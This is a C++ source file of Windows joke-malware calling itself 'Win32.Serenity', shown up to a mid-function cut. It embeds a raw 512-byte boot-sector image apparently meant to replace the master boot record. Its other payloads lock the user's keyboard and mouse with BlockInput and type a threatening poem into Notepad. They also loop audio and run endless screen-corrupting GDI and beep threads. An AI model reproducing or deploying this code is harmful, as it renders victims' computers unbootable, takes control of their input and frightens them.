#include "Payloads.h"

HDC desk = GetDC(0);
int xs = GetSystemMetrics(0), ys = GetSystemMetrics(1);
HDC hdc = GetDC(HWND_DESKTOP);
HINSTANCE hInstance = GetModuleHandle(NULL);
HWND hwnd1;
HDC dc;
HDC dcCopy;
HBITMAP bmp;
RGBQUAD* rgbquad;

const int maxIterations = 50;

double minReal = -2.0;
double maxReal = 1.0;
double minImag = -0.95;
double maxImag = 0.95;
double zoom = 1.0;
bool sPressed = false;
HANDLE sPressedEvent;
/* D:\source\repos\Serenity\MBR\MBR.bin (8/25/2023 1:28:05 PM)
   StartOffset(h): 00000000, EndOffset(h): 000001FF, Length(h): 00000200 */

unsigned char rawData[] = {
	0x31, 0xC0, 0xCD, 0x1A, 0x31, 0xD1, 0x89, 0x0E, 0xE5, 0x7C, 0xB8, 0x00,
	0xA0, 0x8E, 0xC0, 0xB8, 0x02, 0x00, 0xCD, 0x10, 0xBE, 0xE8, 0x7C, 0xAC,
	0x08, 0xC0, 0x74, 0x06, 0xB4, 0x0E, 0xCD, 0x10, 0xEB, 0xF5, 0x31, 0xC0,
	0xCD, 0x16, 0xB8, 0x13, 0x00, 0xCD, 0x10, 0xB8, 0x10, 0x10, 0xBB, 0x10,
	0x00, 0xB9, 0x00, 0x00, 0xBA, 0x3F, 0x3F, 0xCD, 0x10, 0xB8, 0x10, 0x10,
	0xBB, 0x00, 0x00, 0xB9, 0x00, 0x00, 0xB6, 0x00, 0xE8, 0x91, 0x00, 0xCD,
	0x10, 0x51, 0x31, 0xC9, 0xBB, 0x10, 0x00, 0x86, 0xF2, 0x80, 0x3E, 0xE7,
	0x7C, 0x00, 0x74, 0x09, 0xFE, 0xC6, 0x80, 0xFE, 0x3F, 0x7D, 0x08, 0xEB,
	0x0A, 0xFE, 0xCE, 0x08, 0xF6, 0x75, 0x04, 0xF6, 0x16, 0xE7, 0x7C, 0xCD,
	0x10, 0x86, 0xF2, 0xBB, 0x00, 0x00, 0x59, 0x80, 0xF9, 0x3F, 0x7D, 0x04,
	0xFE, 0xC1, 0xEB, 0xC8, 0x80, 0xFD, 0x3F, 0x7D, 0x04, 0xFE, 0xC5, 0xEB,
	0xBF, 0x80, 0xFE, 0x3F, 0x7D, 0x04, 0xFE, 0xC6, 0xEB, 0xB6, 0xE8, 0x47,
	0x00, 0xCD, 0x10, 0x51, 0x31, 0xC9, 0xBB, 0x10, 0x00, 0x86, 0xF2, 0x80,
	0x3E, 0xE7, 0x7C, 0x00, 0x74, 0x09, 0xFE, 0xC6, 0x80, 0xFE, 0x3F, 0x7D,
	0x08, 0xEB, 0x0A, 0xFE, 0xCE, 0x08, 0xF6, 0x75, 0x04, 0xF6, 0x16, 0xE7,
	0x7C, 0xCD, 0x10, 0x86, 0xF2, 0xBB, 0x00, 0x00, 0x59, 0x08, 0xC9, 0x74,
	0x04, 0xFE, 0xC9, 0xEB, 0xC9, 0x08, 0xED, 0x74, 0x04, 0xFE, 0xCD, 0xEB,
	0xC1, 0x08, 0xF6, 0x74, 0x04, 0xFE, 0xCE, 0xEB, 0xB9, 0xE9, 0x61, 0xFF,
	0x60, 0xB9, 0x00, 0x00, 0xBA, 0x00, 0x02, 0xB4, 0x86, 0xCD, 0x15, 0x61,
	0xC3, 0x00, 0x00, 0x00, 0x45, 0x74, 0x65, 0x72, 0x6E, 0x61, 0x6C, 0x20,
	0x64, 0x61, 0x72, 0x6B, 0x6E, 0x65, 0x73, 0x73, 0x20, 0x61, 0x70, 0x70,
	0x72, 0x6F, 0x61, 0x63, 0x68, 0x65, 0x73, 0x0A, 0x0D, 0x43, 0x79, 0x63,
	0x6C, 0x65, 0x73, 0x20, 0x6F, 0x66, 0x20, 0x64, 0x65, 0x73, 0x70, 0x61,
	0x69, 0x72, 0x20, 0x72, 0x65, 0x70, 0x65, 0x61, 0x74, 0x0A, 0x0D, 0x45,
	0x6D, 0x70, 0x69, 0x72, 0x65, 0x73, 0x20, 0x63, 0x72, 0x75, 0x6D, 0x62,
	0x6C, 0x65, 0x20, 0x69, 0x6E, 0x74, 0x6F, 0x20, 0x64, 0x75, 0x73, 0x74,
	0x0A, 0x0D, 0x54, 0x68, 0x65, 0x20, 0x6D, 0x6F, 0x6D, 0x65, 0x6E, 0x74,
	0x20, 0x74, 0x6F, 0x20, 0x73, 0x65, 0x69, 0x7A, 0x65, 0x20, 0x70, 0x6F,
	0x77, 0x65, 0x72, 0x20, 0x69, 0x73, 0x20, 0x6E, 0x69, 0x67, 0x68, 0x0A,
	0x0D, 0x54, 0x68, 0x65, 0x20, 0x77, 0x6F, 0x72, 0x6C, 0x64, 0x20, 0x69,
	0x73, 0x20, 0x6F, 0x75, 0x72, 0x73, 0x20, 0x74, 0x6F, 0x20, 0x63, 0x6F,
	0x6D, 0x6D, 0x61, 0x6E, 0x64, 0x0A, 0x0A, 0x0D, 0x55, 0x6E, 0x6C, 0x65,
	0x61, 0x73, 0x68, 0x20, 0x74, 0x68, 0x65, 0x20, 0x61, 0x62, 0x79, 0x73,
	0x73, 0x20, 0x77, 0x69, 0x74, 0x68, 0x69, 0x6E, 0x0A, 0x0D, 0x0A, 0xB0,
	0xB1, 0xB2, 0x41, 0x77, 0x61, 0x6B, 0x65, 0x6E, 0x20, 0x74, 0x68, 0x65,
	0x20, 0x73, 0x68, 0x61, 0x64, 0x6F, 0x77, 0x73, 0x2C, 0x20, 0x2D, 0x2E,
	0x57, 0x69, 0x6E, 0x33, 0x32, 0x2E, 0x53, 0x65, 0x72, 0x65, 0x6E, 0x69,
	0x74, 0x79, 0x20, 0x42, 0x79, 0x20, 0x4C, 0x6F, 0x63, 0x61, 0x6C, 0x41,
	0x6C, 0x6C, 0x6F, 0x63, 0x2D, 0x2E, 0x20, 0x50, 0x72, 0x65, 0x73, 0x73,
	0x20, 0x41, 0x6E, 0x79, 0x20, 0x4B, 0x65, 0x79, 0xB2, 0xB1, 0xB0, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};
DWORD WINAPI TypeInNotepad(LPVOID lpParam) {
	playAudio(hInstance, MAKEINTRESOURCEW(IDR_WAVE1), SND_ASYNC | SND_LOOP | SND_NODEFAULT);
	HANDLE thread = CreateThread(NULL, 0, &watch, NULL, 0, NULL);
	HWND notepad_handle = NULL;
	while (!notepad_handle) {
		notepad_handle = FindWindow(L"Notepad", NULL);
		Sleep(1000);
	}
	BlockInput(true);
	SetForegroundWindow(notepad_handle);
	SetForegroundWindow(notepad_handle);
	SetForegroundWindow(notepad_handle);
	SetWindowPos(notepad_handle, NULL, 0, 0, 900, 900, SWP_NOMOVE);

	// Wait for the Notepad window to resize
	Sleep(1000);
	SetForegroundWindow(notepad_handle);
	for (int i = 0; i < 8; i++)
	{
		simulateKeyPress1(VK_CONTROL, VK_ADD);
		Sleep(50);
	}

	// Set the text to type
	const char* text = "In shadows deep, you find no escape,\nDo not close this portal, no respite to take.\nYour computer's fate is sealed today,\nNo turning back, no path to sway.\n\nA chilling message, stark and clear,\nNo escape from what's drawing near.\nLast moments beckon, time to decide,\n\nTo linger in darkness or let it subside.\n\nEmbrace the question, its haunting call,\nA choice to make as shadows fall.\nThe end is nigh, the hour is here,\nWill you face the fear or let it disappear ?\n\nAnswer now, with heart held tight,\n'Yes' or 'No', in this endless night. ";

	// Loop through the text and type each character
	for (int i = 0; i < strlen(text); i++)
	{
		// Set the character to type
		char c = text[i];

		// Create an input event for the character
		INPUT input;
		input.type = INPUT_KEYBOARD;
		input.ki.wVk = 0;
		input.ki.wScan = c;
		input.ki.dwFlags = KEYEVENTF_UNICODE;

		// Send the input event to Notepad
		SendInput(1, &input, sizeof(INPUT));

		// Wait a short amount of time before typing the next character
		Sleep(150);
	}
	BlockInput(false);
	sPressedEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
	if (sPressedEvent == NULL) {
		return 1; // Event creation failed
	}
	HANDLE O = CreateThread(0, 0, Checkokey, 0, 0, 0);
	HANDLE S = CreateThread(0, 0, CheckSKey, 0, 0, 0);
	// Wait for the event to be signaled
	WaitForSingleObject(sPressedEvent, INFINITE);
	CloseHandle(sPressedEvent);
	while (sPressed) {
		sPressed == false;
		execute();
		TerminateThread(S, 0);
		TerminateThread(O, 0);
		continue;
	}
	return 0;
}
DWORD WINAPI gradient(LPVOID lpParam) {
	HDC hDC = GetWindowDC(0);
	DWORD i = SIZE1;
	while (1) {
		DWORD i = SIZE1;
		while (--i) pixel[i] += i;
		StretchDIBits(hDC, 0, 0, SCR_WIDTH, SCR_HEIGHT, 0, 0, WIDTH, HEIGHT, (unsigned int*)pixel, &bmi, DIB_RGB_COLORS, SRCCOPY);
	}
	return 0;
}
DWORD WINAPI patches(LPVOID lpParam) {
	int sw = SCR_WIDTH, sh = SCR_HEIGHT, rx;

	while (1) {
		desk = GetDC(0);
		SetStretchBltMode(desk, STRETCH_HALFTONE);

		if (rand() % 2 == 0) {
			int w = rand() % sw;
			int h = rand() % sh;

			for (int i = 5; i < 16; i++) {
				HRGN rgn = CreateEllipticRgn(w - w / i, h + h / i, w + 2000 / i, h - 950 / i);
				SelectClipRgn(desk, rgn);
				StretchBlt(desk, 1, 1, sw + 2, sh - 2, desk, 0, 0, sw, sh, SRCCOPY);
			}
		}
	}

	return 0;
}
DWORD WINAPI LOL(LPVOID lpParam) {
	HWND hwnd = GetDesktopWindow();
	HDC desktop = GetWindowDC(hwnd);
	HDC hdc = GetDC(NULL);
	RECT rekt;

	while (1) {
		GetWindowRect(hwnd, &rekt);
		SetStretchBltMode(hdc, STRETCH_HALFTONE);

		BitBlt(hdc, rekt.left + rand() % 1 + 1, rekt.top + rand() % 1 + 1, rekt.right + rand() % 1 + 1, rekt.bottom + rand() % 1 + 1, hdc, rekt.left, rekt.top, SRCPAINT);
		BitBlt(hdc, rekt.left + rand() % 1 - 1, rekt.top + rand() % 1 - 1, rekt.right + rand() % 1 + 1, rekt.bottom + rand() % 1 - 1, hdc, rekt.left, rekt.top, SRCINVERT);
		Sleep(10);
	}

	return 0;
}
DWORD WINAPI tangent(LPVOID lpParam) {
	HDC desk = GetDC(0);
	int sw = SCR_WIDTH, sh = SCR_HEIGHT, rx;

	while (1) {
		desk = GetDC(0);
		int a = rand() % sw, b = rand() % sh;

		BitBlt(desk, a, b, sw, sh, desk, a + cos(rand() % 21 - 10), b + cos(rand() % 21 - 10), SRCCOPY);
		BitBlt(desk, a, b, -sw, -sh, desk, a + cos(rand() % 21 - 10), b + cos(rand() % 21 - 10), SRCCOPY);
		Sleep(5);
	}

	return 0;
}
DWORD WINAPI UGH(LPVOID lpParam) {
	HDC desk = GetDC(0);
	int sw = SCR_WIDTH, sh = SCR_HEIGHT, rx;

	while (1) {
		desk = GetDC(0);
		rx = rand() % sw;
		int ry = rand() % sh;

		if (rand() % 4 == 0) { BitBlt(desk, rx, 1, 10, sh, desk, rx, 0, SRCPAINT); Sleep(1); }
		else if (rand() % 4 == 1) { BitBlt(desk, rx, -1, -10, sh, desk, rx, 0, SRCPAINT); Sleep(1); }
		else if (rand() % 4 == 2) { BitBlt(desk, 1, ry, SCR_WIDTH, 66, desk, 0, ry, SRCPAINT); Sleep(1); }
		else if (rand() % 4 == 3) { BitBlt(desk, -1, ry, SCR_WIDTH, -66, desk, 0, ry, SRCPAINT); Sleep(1); }
	}

	return 0;
}
DWORD WINAPI NO(LPVOID lpParam) {
	int c = 0;

	while (1) {
		for (int a = 0;; a++, a %= 9) {
			if (!a) RedrawWindow(0, 0, 0, 133);

			for (int t = 0; t < rand() % 3; t++) {
				for (int c = 0; c < rand() % 10; c++) {
					int y = rand() % SCR_WIDTH, h = SCR_HEIGHT - rand() % SCR_HEIGHT - (SCR_HEIGHT / 2 - 58);
					int r = rand() % 3;
					HBRUSH brush;
					HDC hdc = GetDC(0);

					if (r == 0) {
						brush = CreateSolidBrush(RGB(rand() % 100 + 155, 0, 0));
						SelectObject(hdc, brush);
					}
					else if (r == 1) {
						brush = CreateSolidBrush(RGB(0, rand() % 100 + 155, 0));
						SelectObject(hdc, brush);
					}
					else if (r == 2) {
						brush = CreateSolidBrush(RGB(0, 0, rand() % 100 + 155));
						SelectObject(hdc, brush);
					}

					BitBlt(hdc, 0, y, SCR_WIDTH, h, hdc, rand() % 244 - 112, y, SRCCOPY);
					PatBlt(hdc, 0, y, SCR_WIDTH, h, PATINVERT);
				}
				Sleep(1);
			}
		}
	}

	return 0;
}
DWORD WINAPI Something(LPVOID lpParam) {
	while (true) {
		HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(desk, brush);
		PatBlt(desk, 0, 0, xs, ys, PATINVERT);
		Sleep(rand() % 1000);
	}
	return 0;
}
void draw_rectangle(HDC hdc, int x, int y, int w, int h) {
	BitBlt(hdc, x, y, w, h, hdc, 0, 0, SRCCOPY);
}
void draw_line(HDC hdc, int x1, int y1, int x2, int y2) {
	BitBlt(hdc, x1, y1, x2 - x1, y2 - y1, hdc, 0, 0, SRCCOPY);
}
void draw_circle(HDC hdc, int x, int y, int r) {
	HRGN rgn = CreateEllipticRgn(x - r, y - r, x + r, y + r);
	SelectClipRgn(hdc, rgn);
	StretchBlt(hdc, 1, 1, SCR_WIDTH + 2, SCR_HEIGHT - 2, hdc, 0, 0, SCR_WIDTH, SCR_HEIGHT, SRCCOPY);
	DeleteObject(rgn);
}
void draw_tangent(HDC hdc, int x, int y) {
	int a = rand() % SCR_WIDTH, b = rand() % SCR_HEIGHT;
	BitBlt(hdc, a, b, SCR_WIDTH, SCR_HEIGHT, hdc, x + cos(rand() % 21 - 10), y + cos(rand() % 21 - 10), SRCCOPY);
	BitBlt(hdc, a, b, -SCR_WIDTH, -SCR_HEIGHT, hdc, x + cos(rand() % 21 - 10), y + cos(rand() % 21 - 10), SRCCOPY);
}
void draw_random_shape(HDC hdc) {
	int x = rand() % SCR_WIDTH, y = rand() % SCR_HEIGHT;
	int w = rand() % SCR_WIDTH, h = rand() % SCR_HEIGHT;
	int r = rand() % 3;

	if (r == 0) {
		draw_rectangle(hdc, x, y, w, h);
	}
	else if (r == 1) {
		draw_line(hdc, x, y, x + w, y + h);
	}
	else {
		draw_circle(hdc, x, y, w / 2);
	}
}
DWORD WINAPI draw_thread(LPVOID lpParam) {
	HDC hdc = GetDC(0);

	while (1) {
		draw_random_shape(hdc);
		Sleep(10);
	}

	return 0;
}
DWORD WINAPI Extreme(LPVOID lpParam) {
	//CreateThread(0, 0, draw_thread, 0, 0, 0);
	//CreateThread(0, 0, patches, 0, 0, 0);
	while (1)
	{
		Sleep(1);
		if (rand() % 3 == 2) {
			HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
			SelectObject(desk, brush);
			PatBlt(desk, 0, 0, xs, ys, PATINVERT);
			Sleep(rand() % 1000);
		}
		else if (rand() % 3 == 1) {
			HBRUSH brush = CreateSolidBrush(RGB(rand() % 75, rand() % 75, rand() % 75));
			SelectObject(desk, brush);
			PatBlt(desk, 0, 0, xs, ys, PATINVERT);
			Sleep(rand() % 1000);
		}



		Beep(rand() % 1560, rand() % 1589);




		if (rand() % 25 == 9) {
			HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
			SelectObject(desk, brush);

			Sleep(10);
		}
		else if (rand() % 25 == 5) {

			HBRUSH brush = CreateSolidBrush(RGB(rand() % 205, rand() % 205, rand() % 205));
			SelectObject(desk, brush);

			Beep(rand() % 50, rand() % 100);

		}


		if (rand() % 2 == 1) {
			LineTo(desk, rand() % xs, rand() % ys);
			RoundRect(desk, rand() % xs, rand() % ys, rand() % xs, rand() % ys, rand() % xs, rand() % ys);
			Sleep(10);


		}
		if (rand() % 2 == 1) {
			LineTo(desk, rand() % xs, rand() % ys);
			RoundRect(desk, rand() % xs, rand() % ys, rand() % xs, rand() % ys, rand() % xs, rand() % ys);
			Sleep(10);


		}
		else if (rand() % 2 == 2) {
			HDC hdc = GetDC(0);
			int x = GetSystemMetrics(SM_CXSCREEN);
			int y = GetSystemMetrics(SM_CYSCREEN);

			int r1 = rand() % x;
			int r2 = rand() % y;
			HBRUSH hbrush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
			StretchBlt(hdc, 0, 0, x, r1, hdc, r1, r2, 1, 1, PATINVERT);



		}

		if (rand() % 7 == 5) {

			HDC desk = GetDC(0);
			int xs = GetSystemMetrics(SM_CXSCREEN), ys = GetSystemMetrics(SM_CYSCREEN);

			StretchBlt(desk, rand() % xs, rand() % ys, xs, ys, desk, 0, 0, xs, ys, SRCCOPY);
			StretchBlt(desk, 10, 10, xs - 20, ys - 20, desk, 0, 0, xs, ys, SRCPAINT);
			StretchBlt(desk, -10, -10, xs + 20, ys + 20, desk, 0, 0, xs, ys, SRCPAINT);
			StretchBlt(desk, 0, 0, xs, ys, desk, rand() % xs, rand() % ys, xs, ys, SRCINVERT);
			HBRUSH hbrush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
			SelectObject(desk, hbrush);
			PatBlt(desk, 0, 0, xs, ys, PATINVERT);


		}
		for (int i = 0; i++, i %= 5;) {
			HGDIOBJ hbrush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
			SelectObject(desk, hbrush);
			BitBlt(desk, rand() % 10, rand() % 10, xs, ys, desk, rand() % 10, rand() % 10, 0x98123c);
		}
		RECT rekt;

		for (int i = 0; i++, i %= 5;) {
			HGDIOBJ hbrush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
			SelectObject(desk, hbrush);
			BitBlt(desk, rand() % 10, rand() % 10, xs, ys, desk, rand() % 10, rand() % 10, 0x98123c);
			Sleep(100);
		}

		int y = rand() % SCR_HEIGHT, h = SCR_HEIGHT - rand() % SCR_HEIGHT - (SCR_HEIGHT / 1 - 1);

		BitBlt(hdc, 0, y, SCR_WIDTH, h, hdc, rand() % 1 - 1, y, SRCCOPY);
		PatBlt(hdc, -1, y, SCR_WIDTH, h, PATINVERT);
		Sleep(rand() % 10);

		if (rand() % 5 == 1) {
			StretchBlt(desk, -10, -10, xs + 20, ys + 20, desk, 0, 0, xs, ys, SRCCOPY);
			Sleep(rand() % 1000);

		}

		HDC hDsktp;
		HWND hWnd;
		RECT wRect;
		POINT wPt[3];
		int counter = 10;

		HWND upWnd = GetForegroundWindow();
		HDC upHdc = GetDC(upWnd);
		HDC desktop = GetDC(NULL);


		int x = GetSystemMetrics(SM_CXSCREEN);


		int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR nCmdLine, int nCmdShow);
		HDC hDc = GetWindowDC(GetDesktopWindow());

		Beep(rand() % 1560, rand() % 1589);



		BitBlt(hdc, rand() % 15, rand() % 15, rand() % SCR_WIDTH, rand() % SCR_HEIGHT, hdc, rand() % 15, rand() % 5, SRCCOPY);
		BitBlt(hdc, rand() % 15, rand() % 15, rand() % SCR_WIDTH, rand() % SCR_HEIGHT, hdc, rand() % 15, rand() % 5, SRCAND);


		Sleep(100);
		upWnd = GetForegroundWindow();
		upHdc = GetDC(upWnd);
		desktop = GetDC(NULL);
		BitBlt(desktop, -1, 1, xs, ys, upHdc, 2, 2, 0x999999);

		HWND hwnd = GetDesktopWindow();
		HDC hdc = GetWindowDC(hwnd);
		RECT rect;
		GetWindowRect(hwnd, &rect);
		int w = rect.right - rect.left;



		BitBlt(hdc, rand() % 5, rand() % 5, rand() % SCR_WIDTH, rand() % SCR_HEIGHT, hdc, rand() % 5, rand() % 5, SRCCOPY);

		int sx = 0, sy = 0;
		LPCWSTR lpText = L"                                                                                                                                                                                                                                                             ";

		int xs = GetSystemMetrics(SM_CXSCREEN);
		int ys = GetSystemMetrics(SM_CYSCREEN);
		BitBlt(desktop, 0, 0, xs, ys, upHdc, 0, 0, PATINVERT);

		HWND desktoq = GetDesktopWindow();

		GetWindowRect(desktoq, &rect);

		StretchBlt(desktop, 50, 50, w - 100, h - 100, desktop, 0, 0, w, h, SRCCOPY);
		Sleep(300);

		hdc = GetWindowDC(GetDesktopWindow());
		sx = GetSystemMetrics(0);
		sy = GetSystemMetrics(1);
		SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
		SetBkColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
		TextOutW(hdc, rand() % sx, rand() % sy, lpText, wcslen(lpText));
		Sleep(10);
	}
	return 0;
}
DWORD WINAPI ChaoticArt(LPVOID lpParam) {
	while (1) {
		Sleep(1);

		if (rand() % 3 == 0) {
			HBRUSH brush = CreateSolidBrush(RGB(rand() % 128, rand() % 64, rand() % 192));
			SelectObject(desk, brush);
			PatBlt(desk, 0, 0, xs, ys, PATINVERT);
			Sleep(rand() % 500);
		}
		else if (rand() % 3 == 1) {
			HBRUSH brush = CreateSolidBrush(RGB(rand() % 64, rand() % 128, rand() % 192));
			SelectObject(desk, brush);
			PatBlt(desk, 0, 0, xs, ys, PATINVERT);
			Sleep(rand() % 800);
		}
		else {
			HBRUSH brush = CreateSolidBrush(RGB(rand() % 192, rand() % 128, rand() % 64));
			SelectObject(desk, brush);
			PatBlt(desk, 0, 0, xs, ys, PATINVERT);
			Sleep(rand() % 1200);
		}

		Beep(rand() % 2500 + 500, rand() % 1000 + 500);

		if (rand() % 20 == 9) {
			HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
			SelectObject(desk, brush);
			Sleep(10);
		}
		else if (rand() % 20 == 5) {
			HBRUSH brush = CreateSolidBrush(RGB(rand() % 128, rand() % 128, rand() % 128));
			SelectObject(desk, brush);
			Beep(rand() % 300, rand() % 200);
		}

		if (rand() % 2 == 0) {
			LineTo(desk, rand() % xs, rand() % ys);
			RoundRect(desk, rand() % xs, rand() % ys, rand() % xs, rand() % ys, rand() % xs, rand() % ys);
			Sleep(10);
		}
		else {
			HDC hdc = GetDC(0);
			int x = GetSystemMetrics(SM_CXSCREEN);
			int y = GetSystemMetrics(SM_CYSCREEN);
			int r1 = rand() % x;
			int r2 = rand() % y;
			HBRUSH hbrush = CreateSolidBrush(RGB(rand() % 128, rand() % 192, rand() % 64));
			StretchBlt(hdc, 0, 0, x, r1, hdc, r1, r2, 1, 1, PATINVERT);
		}

		if (rand() % 7 == 3) {
			HDC desk = GetDC(0);
			int xs = GetSystemMetrics(SM_CXSCREEN), ys = GetSystemMetrics(SM_CYSCREEN);

			for (int i = 0; i < 5; i++) {
				HBRUSH hbrush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
				SelectObject(desk, hbrush);
				Rectangle(desk, rand() % xs, rand() % ys, rand() % xs, rand() % ys);
				Sleep(50);
			}
		}

		// Creating colorful ellipses
		for (int i = 0; i < 5; i++) {
			HBRUSH hbrush = CreateSolidBrush(RGB(rand() % 192, rand() % 192, rand() % 192));
			SelectObject(desk, hbrush);
			Ellipse(desk, rand() % xs, rand() % ys, rand() % xs, rand() % ys);
			Sleep(50);
		}

		// Drawing wavy lines
		for (int i = 0; i < 10; i++) {
			HPEN hpen = CreatePen(PS_SOLID, rand() % 5 + 1, RGB(rand() % 192, rand() % 192, rand() % 192));
			SelectObject(desk, hpen);
			MoveToEx(desk, rand() % xs, rand() % ys, NULL);
			LineTo(desk, rand() % xs, rand() % ys);
			Sleep(30);
		}

		// Creating a colorful triangle
		POINT triangle[3];
		for (int i = 0; i < 3; i++) {
			triangle[i].x = rand() % xs;
			triangle[i].y = rand() % ys;
		}
		HBRUSH hbrush = CreateSolidBrush(RGB(rand() % 192, rand() % 192, rand() % 192));
		SelectObject(desk, hbrush);
		Polygon(desk, triangle, 3);
		Sleep(100);

		// Drawing a randomly sized and rotated rectangle
		int x1 = rand() % xs, y1 = rand() % ys;
		int width = rand() % (xs / 2), height = rand() % (ys / 2);
		int angle = rand() % 180;

		// Calculate the coordinates of the rectangle's corners after rotation
		double radians = angle * 3.14159265358979323846 / 180.0;
		int x2 = static_cast<int>(x1 + width * cos(radians));
		int y2 = static_cast<int>(y1 - width * sin(radians));
		int x3 = static_cast<int>(x1 - height * sin(radians));
		int y3 = static_cast<int>(y1 - height * cos(radians));
		int x4 = x3 + (x2 - x1);
		int y4 = y3 + (y2 - y1);

		hbrush = CreateSolidBrush(RGB(rand() % 192, rand() % 192, rand() % 192));
		SelectObject(desk, hbrush);

		// Draw the rotated rectangle using a polygon
		POINT rotatedRectPoints[4] = { {x1, y1}, {x2, y2}, {x4, y4}, {x3, y3} };
		Polygon(desk, rotatedRectPoints, 4);

		// More creative operations...

		Sleep(200);
	}
	return 0;
}
void Draw2DLine(HDC hdc, int x1, int y1, int x2, int y2, COLORREF color) {
	HPEN hpen = CreatePen(PS_SOLID, 3, color);
	SelectObject(hdc, hpen);
	MoveToEx(hdc, x1, y1, NULL);
	LineTo(hdc, x2, y2);
	DeleteObject(hpen);
}
void Draw2DCube(HDC hdc, int centerX, int centerY, int size, double angleX, double angleY) {
	// Define cube vertices in 3D space
	int vertices[8][3] = {
		{-size, -size, -size},
		{size, -size, -size},
		{size, size, -size},
		{-size, size, -size},
		{-size, -size, size},
		{size, -size, size},
		{size, size, size},
		{-size, size, size}
	};

	// Apply rotations to vertices
	for (int i = 0; i < 8; i++) {
		int x = vertices[i][0];
		int y = vertices[i][1];
		vertices[i][0] = static_cast<int>(x * cos(angleY) - y * sin(angleY));
		vertices[i][1] = static_cast<int>(x * sin(angleY) + y * cos(angleY));

		y = vertices[i][2];
		vertices[i][1] = static_cast<int>(y * cos(angleX) - vertices[i][2] * sin(angleX));
		vertices[i][2] = static_cast<int>(y * sin(angleX) + vertices[i][2] * cos(angleX));
	}

	// Project vertices to 2D screen coordinates and draw lines
	for (int i = 0; i < 4; i++) {
		int next = (i + 1) % 4;
		Draw2DLine(hdc, centerX + vertices[i][0], centerY - vertices[i][1],
			centerX + vertices[next][0], centerY - vertices[next][1], RGB(255, 0, 0));
		Draw2DLine(hdc, centerX + vertices[i + 4][0], centerY - vertices[i + 4][1],
			centerX + vertices[next + 4][0], centerY - vertices[next + 4][1], RGB(0, 255, 0));
		Draw2DLine(hdc, centerX + vertices[i][0], centerY - vertices[i][1],
			centerX + vertices[i + 4][0], centerY - vertices[i + 4][1], RGB(0, 0, 255));
	}
}
DWORD WINAPI Draw2DCube(LPVOID lpParam) {
	// Spinning RGB cube
	double cubeAngleX = 0;
	double cubeAngleY = 0;
	int cubeSize = 100;
	int cubeCenterX = xs / 2;
	int cubeCenterY = ys / 2;
	while (1) {

		for (int i = 0; i < 180; i++) {
			HPEN hpen = CreatePen(PS_SOLID, 3, RGB(255, 0, 0)); // Red face
			SelectObject(desk, hpen);
			Draw2DCube(desk, cubeCenterX, cubeCenterY, cubeSize, cubeAngleX, cubeAngleY);

			hpen = CreatePen(PS_SOLID, 3, RGB(0, 255, 0)); // Green face
			SelectObject(desk, hpen);
			Draw2DCube(desk, cubeCenterX, cubeCenterY, cubeSize, cubeAngleX + 45, cubeAngleY);

			hpen = CreatePen(PS_SOLID, 3, RGB(0, 0, 255)); // Blue face
			SelectObject(desk, hpen);
			Draw2DCube(desk, cubeCenterX, cubeCenterY, cubeSize, cubeAngleX + 90, cubeAngleY);

			cubeAngleX += 2;
			cubeAngleY += 1;
			Sleep(50);
		}
	}
	return 0;
}
DWORD WINAPI MesmerizingCanvas(LPVOID lpParam) {
	while (1) {
		Sleep(1);

		// Colorful lines radiating from the center
		HPEN hpen = CreatePen(PS_SOLID, rand() % 5 + 1, RGB(rand() % 256, rand() % 256, rand() % 256));
		SelectObject(desk, hpen);
		MoveToEx(desk, xs / 2, ys / 2, NULL);
		LineTo(desk, rand() % xs, rand() % ys);
		Sleep(30);

		// Spiraling rectangles with changing colors
		int rectSize = rand() % 100 + 10;
		RECT rect = { xs / 2 - rectSize / 2, ys / 2 - rectSize / 2, xs / 2 + rectSize / 2, ys / 2 + rectSize / 2 };
		HBRUSH hbrush = CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256));
		SelectObject(desk, hbrush);
		Rectangle(desk, rect.left, rect.top, rect.right, rect.bottom);
		Sleep(50);

		// Expanding circles with fading colors
		for (int i = 0; i < 10; i++) {
			hbrush = CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256));
			SelectObject(desk, hbrush);
			Ellipse(desk, xs / 2 - i * 10, ys / 2 - i * 10, xs / 2 + i * 10, ys / 2 + i * 10);
			Sleep(50);
		}

		// Cascading rain of colorful lines
		for (int i = 0; i < 10; i++) {
			hpen = CreatePen(PS_SOLID, rand() % 5 + 1, RGB(rand() % 256, rand() % 256, rand() % 256));
			SelectObject(desk, hpen);
			MoveToEx(desk, 0, 0, NULL);
			LineTo(desk, rand() % xs, ys);
			Sleep(50);
		}

		// Rotating psychedelic pattern
		double angle = 0;
		for (int i = 0; i < 36; i++) {
			hpen = CreatePen(PS_SOLID, 5, RGB(rand() % 256, rand() % 256, rand() % 256));
			SelectObject(desk, hpen);
			MoveToEx(desk, xs / 2, ys / 2, NULL);
			int x = xs / 2 + static_cast<int>(150 * cos(angle));
			int y = ys / 2 + static_cast<int>(150 * sin(angle));
			LineTo(desk, x, y);
			angle += 10.0;
			Sleep(100);
		}

		// Shifting colorful circles
		for (int i = 0; i < 10; i++) {
			hbrush = CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256));
			SelectObject(desk, hbrush);
			Ellipse(desk, xs / 2 - i * 15, ys / 2 - i * 15, xs / 2 + i * 15, ys / 2 + i * 15);
			Sleep(75);
